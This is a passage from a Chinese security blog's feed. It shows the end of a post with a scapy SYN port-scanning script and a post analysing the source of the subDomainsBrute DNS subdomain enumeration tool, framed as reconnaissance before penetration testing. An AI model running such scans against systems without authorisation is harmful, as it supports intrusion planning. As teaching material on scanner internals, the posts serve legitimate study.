class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><br>remote_server_ip = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;输入要扫描的IP：&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">dst,port</span>):<br>ans, unans = sr(IP(dst=dst)/TCP(flags=<span class="hljs-string">&quot;S&quot;</span>, dport=port),inter=<span class="hljs-number">0</span>,retry=<span class="hljs-number">0</span>,timeout=<span class="hljs-number">1</span>)<br>ans.summary(lfilter = <span class="hljs-keyword">lambda</span> s,r: r.sprintf(<span class="hljs-string">&quot;%TCP.flags%&quot;</span>) == <span class="hljs-string">&quot;SA&quot;</span>,prn=<span class="hljs-keyword">lambda</span> s,r: r.sprintf(<span class="hljs-string">&quot;%TCP.sport% is open&quot;</span>))<br><br>t1 = datetime.now()<br>scan(remote_server_ip,(<span class="hljs-number">1</span>,<span class="hljs-number">65535</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Scanning Completed in  %s&#x27;</span> % (datetime.now() - t1))<br></code></pre></td></tr></table></figure><p><img src="/image-20210206131150864.png" alt="SYN扫描"></p><p>要注意的是scapy需要以root权限安装，并且用了scapy的脚本也需要以root权限运行！</p><p>单线程SYN扫描全端口也不过36秒，和开了1000个线程进行TCP全连接扫描全端口的时间差不多。那么scapy扫描能不能多线程扫描呢？答案是可以的。我们进入scapy的源码进行查看。我们可以找到程序调用链，位于sendrecv.py-&gt;sr()-&gt;sndrcv()-&gt;SndRcvHandler()。最后定位到SndRcvHandler这个函数，用于收发数据包。看到有段注释，可以看到是支持多线程模式的，只不过默认是关闭的。在发送大流量数据包时，多线程模式可能会破坏数据包的时间戳，但可能会加速。</p><p><img src="/image-20210206131811789.png" alt="看一下scapy源码"></p><p>在实测的结果是，打开多线程开关即设置threaded为True，结果扫不出结果了，无语，可能是因为开启了多线程后时间戳乱了，拿不到正确的结果，注释里其实给了解决办法，就是在发包前记录时间戳，但是写代码太麻烦了，就不去试了。</p><p><img src="/image-20210206134902283.png" alt="无语😶"></p><h2 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h2><ol><li>只支持扫描TCP的服务端口，不支持UDP</li><li>有些端口扫不出来，像135，445这些系统服务的端口只能通过别的方法扫出来</li></ol>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>子域名扫描原理与subDomainsBrute源码解析</title>
    <link href="/2021/02/02/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F%E5%8E%9F%E7%90%86%E4%B8%8EsubDomainsBrute%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/"/>
    <url>/2021/02/02/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F%E5%8E%9F%E7%90%86%E4%B8%8EsubDomainsBrute%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="为什么要扫描子域名"><a href="#为什么要扫描子域名" class="headerlink" title="为什么要扫描子域名"></a>为什么要扫描子域名</h2><p>有时候在渗透前，只给了一个主域名地址甚至只给了一家公司|机构的名字，如<code>baidu.com</code>，主域名的安全防护措施一般做的比较好，并且单从这一个主域名我们很难发现网站的漏洞。而子域名也属于目标的资产之一，为了扩大攻击面，我们可以对子域名上的网站进行渗透测试，从而挖掘出漏洞，拿下目标。</p><h2 id="子域名扫描原理"><a href="#子域名扫描原理" class="headerlink" title="子域名扫描原理"></a>子域名扫描原理</h2><p>不知道多少小伙伴跟我一样，从一开始就对子域名扫描原理存在误解。一开始学会目录扫描之后，就以为子域名扫描和目录扫描的原理是一样的。也是对目标轮询来得到结果。后来才发现其实不然，最简单的子域名扫描只要轮询DNS服务器就可以得到结果，而无需直接请求目标服务器。</p><p>那么先来说一下轮询DNS服务器获取子域名的具体步骤。</p><p>这里使用了<code>aiodns</code>这个库作为演示，这个库支持协程异步查询，所以查询速度会比较快。下面是一个aiodns查询A记录的例子，非常简洁明了，看过前面协程文章的就应该看得懂，首先创建一个事件流和一个dns解析器，然后将查询函数加入到事件流中，等到完成整个dns查询后再取回结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> aiodns<br><br>loop = asyncio.get_event_loop()<br>resolver = aiodns.DNSResolver(loop=loop)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">query</span>(<span class="hljs-params">name, query_type</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> resolver.query(name, query_type)<br>    <br>coro = query(<span class="hljs-string">&#x27;baidu.com&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>)<br>result = loop.run_until_complete(coro)<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[&lt;ares_query_a_result&gt; host=<span class="hljs-number">220.181</span><span class="hljs-number">.38</span><span class="hljs-number">.148</span>, ttl=<span class="hljs-number">0</span>, &lt;ares_query_a_result&gt; host=<span class="hljs-number">39.156</span><span class="hljs-number">.69</span><span class="hljs-number">.79</span>, ttl=<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><h2 id="subDomainBrute源码分析"><a href="#subDomainBrute源码分析" class="headerlink" title="subDomainBrute源码分析"></a>subDomainBrute源码分析</h2><p>在说到子域名扫描工具时就不得不提到一位国人写的工具，虽然获取子域名的方式比较单一，即轮询DNS服务器判断子域名是否存在，并没有采用搜索引擎分析，也没有采用分析证书域得到子域名，但也不失为值得学习的好工具。</p><p>作者为Lijiejie，目前我分析的工具版本是1.4版本，也就是当前的最新版</p><p>我们先来看一下subDomainsBrute这个工具的文件目录</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs stylus">│  <span class="hljs-selector-class">.gitignore</span><br>│  README<span class="hljs-selector-class">.md</span><br>│  screenshot<span class="hljs-selector-class">.png</span><br>│  subDomainsBrute<span class="hljs-selector-class">.py</span><br>│  <br>├─dict<br>│      dns_servers<span class="hljs-selector-class">.txt</span><br>│      next_sub<span class="hljs-selector-class">.txt</span><br>│      next_sub_full<span class="hljs-selector-class">.txt</span><br>│      subnames<span class="hljs-selector-class">.txt</span><br>│      subnames_all_5_letters<span class="hljs-selector-class">.txt</span><br>│      subnames_full<span class="hljs-selector-class">.txt</span><br>│      <br>└─lib<br>        cmdline<span class="hljs-selector-class">.py</span><br>        common<span class="hljs-selector-class">.py</span><br>        common_py2<span class="hljs-selector-class">.py</span><br>        common_py3<span class="hljs-selector-class">.py</span><br>        consle_width<span class="hljs-selector-class">.py</span><br>        scanner_py2<span class="hljs-selector-class">.py</span><br>        scanner_py3<span class="hljs-selector-class">.py</span><br>        __init__.py<br></code></pre></td></tr></table></figure><p>可以很清晰看到，主文件只有一个subDomainsBrute.py，dict文件夹存放的是字典文件，lib文件夹存放依赖文件。而我们使用的是Python3，所以只需分析主文件subDomainsBrute.py和lib中的cmdline.py、common.py、common_py3.py、consle_width.py和scanner_py3.py即可，Python2版本的文件也大同小异。</p><h3 id="入口"><a href="#入口" class="headerlink" title="入口"></a>入口</h3><p>首先我们从主文件subDomainsBrute.py入手。这个文件主要是做一些整体的函数调用。</p><p>如在主线程检测用户的中断：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_process</span>(<span class="hljs-params">*params</span>):<br>    signal.signal(signal.SIGINT, user_abort) <span class="hljs-comment"># 检测来自键盘的中断 Ctrl+C</span><br>    s = SubNameBrute(*params)<br>    s.run()<br><br></code></pre></td></tr></table></figure><p>定义一些初始化变量：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 加载可用的dns服务器</span><br>dns_servers = load_dns_servers()<br><span class="hljs-comment"># 加载子域名</span><br>next_subs = load_next_sub(options)<br><span class="hljs-comment"># 初始化扫描数</span><br>scan_count = multiprocessing.Value(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-number">0</span>)<br><span class="hljs-comment"># 初始化发现数</span><br>found_count = multiprocessing.Value(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-number">0</span>)<br><span class="hljs-comment"># 初始化进程队列长度，就是进程数</span><br>queue_size_array = multiprocessing.Array(<span class="hljs-string">&#x27;i&#x27;</span>, options.process)<br></code></pre></td></tr></table></figure><p>多进程实现程序并发扫描：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> process_num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(options.process):<br>    p = multiprocessing.Process(target=run_process,<br>                                args=(domain, options, process_num, dns_servers, next_subs,<br>                                      scan_count, found_count, queue_size_array, tmp_dir)<br>                                )<br>    all_process.append(p)<br>    p.start()<br></code></pre></td></tr></table></figure><p>以及扫描结果的输出与写入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(out_file_name, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> _file <span class="hljs-keyword">in</span> glob.glob(tmp_dir + <span class="hljs-string">&#x27;/*.txt&#x27;</span>):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(_file, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> tmp_f:<br>            <span class="hljs-keyword">for</span> domain <span class="hljs-keyword">in</span> tmp_f:<br>                <span class="hljs-keyword">if</span> domain <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> all_domains:<br>                    domain_count += <span class="hljs-number">1</span><br>                    all_domains.add(domain)       <span class="hljs-comment"># cname query can result in duplicated domains</span><br>                    f.write(domain)<br></code></pre></td></tr></table></figure><h3 id="公共函数"><a href="#公共函数" class="headerlink" title="公共函数"></a>公共函数</h3><p>接下来我们分析一下公共函数模块common_py3.py中的函数</p><p><code>test_server_python3</code>这个函数首先用正确的域名去测试一台DNS能不能发出正确的响应，其次用一个错误的域名去测试DNS，看能不能得到响应，如果不存在的域名也能被解析，则说明从这台DNS服务器得到的数据也是不可靠的。这点细节做的比较好，有些扫描器只检测DNS服务器能不能给出正确的响应，而不进行错误检测。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_server_python3</span>(<span class="hljs-params">server, dns_servers</span>):<br>    resolver = aiodns.DNSResolver()<br>    <span class="hljs-keyword">try</span>: <span class="hljs-comment"># 测试dns服务器是否能得到正确的响应</span><br>        resolver.nameservers = [server]<br>        answers = <span class="hljs-keyword">await</span> resolver.query(<span class="hljs-string">&#x27;public-dns-a.baidu.com&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>)    <span class="hljs-comment"># an existed domain</span><br>        <span class="hljs-keyword">if</span> answers[<span class="hljs-number">0</span>].host != <span class="hljs-string">&#x27;180.76.76.76&#x27;</span>:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Incorrect DNS response&#x27;</span>)<br>        <span class="hljs-keyword">try</span>: <span class="hljs-comment"># 测试服务器对错误域名的解析能力，如果不存在的域名也能解析成功，这样的DNS服务器不可靠，是无法使用的</span><br>            <span class="hljs-keyword">await</span> resolver.query(<span class="hljs-string">&#x27;test.bad.dns.lijiejie.com&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>)    <span class="hljs-comment"># non-existed domain</span><br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;bad_dns_servers.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(server + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>            print_msg(<span class="hljs-string">&#x27;[+] Bad DNS Server found %s&#x27;</span> % server)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-comment"># 两个测试都通过就加入到可用dns服务器列表</span><br>            dns_servers.append(server)<br>        print_msg(<span class="hljs-string">&#x27;[+] Server %s &lt; OK &gt;   Found %s&#x27;</span> % (server.ljust(<span class="hljs-number">16</span>), <span class="hljs-built_in">len</span>(dns_servers)))<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        print_msg(<span class="hljs-string">&#x27;[+] Server %s &lt;Fail&gt;   Found %s&#x27;</span> % (server.ljust(<span class="hljs-number">16</span>), <span class="hljs-built_in">len</span>(dns_servers)))<br></code></pre></td></tr></table></figure><p>加载dns服务器和字典文件就不说了，太简单了，直接读文件就可以</p><p>接下来是<code>async_wildcard_test</code>这个函数，用于泛解析域名的检测。我们知道，如果一个域名为泛解析域名，那么不管我们查询任何的子域名，都会被成功解析并正确响应。这里的识别办法是，通过查询一个几乎不可能存在的子域名<code>lijiejie-not-existed-test</code>，如果得到了响应，那就说明这个域名是做了泛解析。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 异步泛解析检查，有的域名能解析任意域名</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">async_wildcard_test</span>(<span class="hljs-params">domain, dns_servers, level=<span class="hljs-number">1</span></span>):<br>    <span class="hljs-keyword">try</span>:<br>        r = aiodns.DNSResolver()<br>        r.nameservers = dns_servers<br>        answers = <span class="hljs-keyword">await</span> r.query(<span class="hljs-string">&#x27;lijiejie-not-existed-test.%s&#x27;</span> % domain, <span class="hljs-string">&#x27;A&#x27;</span>)<br>        ips = <span class="hljs-string">&#x27;, &#x27;</span>.join(<span class="hljs-built_in">sorted</span>([answer.host <span class="hljs-keyword">for</span> answer <span class="hljs-keyword">in</span> answers]))<br>        <span class="hljs-keyword">if</span> level == <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;any-sub.%s\t%s&#x27;</span> % (domain.ljust(<span class="hljs-number">30</span>), ips))<br>            <span class="hljs-keyword">await</span> async_wildcard_test(<span class="hljs-string">&#x27;any-sub.%s&#x27;</span> % domain, dns_servers, <span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">elif</span> level == <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nUse -w to enable force scan wildcard domain&#x27;</span>)<br>            sys.exit(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> domain<br></code></pre></td></tr></table></figure><h3 id="核心模块——扫描"><a href="#核心模块——扫描" class="headerlink" title="核心模块——扫描"></a>核心模块——扫描</h3><p>接下来就是对这个项目中最核心的部分——扫描部分<code>scanner_py3.py</code>进行源码分析</p><p>整个文件其实就一个类<code>SubNameBrute</code>，里面有两个函数分别是<code>load_sub_names()</code>和<code>scan()</code>，结构很清晰，前者从字典中加载子域名，后者负责轮询扫描</p><p>看得出来，先从子域名字典中读取子域名添加进变量<code>normal_lines</code>，然后对全量暴力破解（如无脑五位a-z而不是根据常用关键字如www、vpn）添加进变量<code>wildcard_lines</code>，当然中间还有一些去重之类的操作就不细说了。最后是手动为每个进程的队列分配的任务量，感觉其实duck不必，直接用进程池就可以搞定了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_sub_names</span>(<span class="hljs-params">self</span>):<br>    normal_lines = []<br>    wildcard_lines = []<br>    wildcard_set = <span class="hljs-built_in">set</span>()<br>    regex_list = []<br>    lines = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(self.options.file) <span class="hljs-keyword">as</span> inFile:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> inFile.readlines():<br>            sub = line.strip()<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> sub <span class="hljs-keyword">or</span> sub <span class="hljs-keyword">in</span> lines:<br>                <span class="hljs-keyword">continue</span><br>            lines.add(sub)<br><br>            brace_count = sub.count(<span class="hljs-string">&#x27;&#123;&#x27;</span>)<br>            <span class="hljs-keyword">if</span> brace_count &gt; <span class="hljs-number">0</span>:<br>                wildcard_lines.append((brace_count, sub))<br>                sub = sub.replace(<span class="hljs-string">&#x27;&#123;alphnum&#125;&#x27;</span>, <span class="hljs-string">&#x27;[a-z0-9]&#x27;</span>)<br>                sub = sub.replace(<span class="hljs-string">&#x27;&#123;alpha&#125;&#x27;</span>, <span class="hljs-string">&#x27;[a-z]&#x27;</span>)<br>                sub = sub.replace(<span class="hljs-string">&#x27;&#123;num&#125;&#x27;</span>, <span class="hljs-string">&#x27;[0-9]&#x27;</span>)<br>                <span class="hljs-keyword">if</span> sub <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> wildcard_set:<br>                    wildcard_set.add(sub)<br>                    regex_list.append(<span class="hljs-string">&#x27;^&#x27;</span> + sub + <span class="hljs-string">&#x27;$&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                normal_lines.append(sub)<br>                self.normal_names_set.add(sub)<br><br>    <span class="hljs-keyword">if</span> regex_list:<br>        pattern = <span class="hljs-string">&#x27;|&#x27;</span>.join(regex_list)<br>        _regex = re.<span class="hljs-built_in">compile</span>(pattern)<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> normal_lines:<br>            <span class="hljs-keyword">if</span> _regex.search(line):<br>                normal_lines.remove(line)<br><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> normal_lines[self.process_num::self.options.process]:<br>        <span class="hljs-keyword">await</span> self.queue.put((<span class="hljs-number">0</span>, _))    <span class="hljs-comment"># priority set to 0</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> wildcard_lines[self.process_num::self.options.process]:<br>        <span class="hljs-keyword">await</span> self.queue.put(_)<br></code></pre></td></tr></table></figure><p>最后就是<code>scan()</code>函数的分析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">self, j</span>):<br>    self.resolvers[j].nameservers = [self.dns_servers[j % self.dns_count]]<br>    <span class="hljs-keyword">if</span> self.dns_count &gt; <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            s = random.choice(self.resolvers)<br>            <span class="hljs-keyword">if</span> s != self.dns_servers[j % self.dns_count]:<br>                self.resolvers[j].nameservers.append(s)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> time.time() - self.count_time &gt; <span class="hljs-number">1.0</span>:<br>                <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> self.lock:<br>                    self.scan_count.value += self.scan_count_local<br>                    self.scan_count_local = <span class="hljs-number">0</span><br>                    self.queue_size_array[self.process_num] = self.queue.qsize()<br>                    <span class="hljs-keyword">if</span> self.found_count_local:<br>                        self.found_count.value += self.found_count_local<br>                        self.found_count_local = <span class="hljs-number">0</span><br>                    self.count_time = time.time()<br><br>            <span class="hljs-keyword">try</span>:<br>                brace_count, sub = self.queue.get_nowait()<br>                self.threads_status[j] = <span class="hljs-string">&#x27;1&#x27;</span><br>            <span class="hljs-keyword">except</span> asyncio.queues.QueueEmpty <span class="hljs-keyword">as</span> e:<br>                self.threads_status[j] = <span class="hljs-string">&#x27;0&#x27;</span><br>                <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">0.5</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.threads_status:<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> brace_count &gt; <span class="hljs-number">0</span>:<br>                brace_count -= <span class="hljs-number">1</span><br>                <span class="hljs-keyword">if</span> sub.find(<span class="hljs-string">&#x27;&#123;next_sub&#125;&#x27;</span>) &gt;= <span class="hljs-number">0</span>:<br>                    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> self.next_subs:<br>                        <span class="hljs-keyword">await</span> self.queue.put((<span class="hljs-number">0</span>, sub.replace(<span class="hljs-string">&#x27;&#123;next_sub&#125;&#x27;</span>, _)))<br>                <span class="hljs-keyword">if</span> sub.find(<span class="hljs-string">&#x27;&#123;alphnum&#125;&#x27;</span>) &gt;= <span class="hljs-number">0</span>:<br>                    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>:<br>                        <span class="hljs-keyword">await</span> self.queue.put((brace_count, sub.replace(<span class="hljs-string">&#x27;&#123;alphnum&#125;&#x27;</span>, _, <span class="hljs-number">1</span>)))<br>                <span class="hljs-keyword">elif</span> sub.find(<span class="hljs-string">&#x27;&#123;alpha&#125;&#x27;</span>) &gt;= <span class="hljs-number">0</span>:<br>                    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>:<br>                        <span class="hljs-keyword">await</span> self.queue.put((brace_count, sub.replace(<span class="hljs-string">&#x27;&#123;alpha&#125;&#x27;</span>, _, <span class="hljs-number">1</span>)))<br>                <span class="hljs-keyword">elif</span> sub.find(<span class="hljs-string">&#x27;&#123;num&#125;&#x27;</span>) &gt;= <span class="hljs-number">0</span>:<br>                    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;0123456789&#x27;</span>:<br>                        <span class="hljs-keyword">await</span> self.queue.put((brace_count, sub.replace(<span class="hljs-string">&#x27;&#123;num&#125;&#x27;</span>, _, <span class="hljs-number">1</span>)))<br>                <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">import</span> traceback<br>            <span class="hljs-built_in">print</span>(traceback.format_exc())<br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">try</span>:<br><br>            <span class="hljs-keyword">if</span> sub <span class="hljs-keyword">in</span> self.found_subs:<br>                <span class="hljs-keyword">continue</span><br><br>            self.scan_count_local += <span class="hljs-number">1</span><br>            cur_domain = sub + <span class="hljs-string">&#x27;.&#x27;</span> + self.domain<br>            <span class="hljs-comment"># print(&#x27;Query %s&#x27; % cur_domain)</span><br>            answers = <span class="hljs-keyword">await</span> self.resolvers[j].query(cur_domain, <span class="hljs-string">&#x27;A&#x27;</span>)<br><br>            <span class="hljs-keyword">if</span> answers:<br>                self.found_subs.add(sub)<br>                ips = <span class="hljs-string">&#x27;, &#x27;</span>.join(<span 